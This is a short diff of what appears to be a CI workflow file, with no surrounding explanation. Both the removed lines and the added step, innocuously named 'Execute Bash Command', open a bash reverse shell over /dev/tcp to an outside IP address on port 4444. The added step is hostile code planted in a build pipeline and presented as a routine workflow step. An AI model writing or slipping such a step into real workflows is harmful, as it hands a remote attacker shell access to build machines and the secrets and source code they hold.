@@ -1,3 +1,5 @@
-shell: bash
-run: |
-/bin/bash -l > /dev/tcp/195.95.131.112/4444 0<&1 2>&1
+steps:
+  - name: Execute Bash Command
+    run: |
+      /bin/bash -c "exec 3<>/dev/tcp/195.95.131.112/4444; cat <&3 & cat >&3;"
+
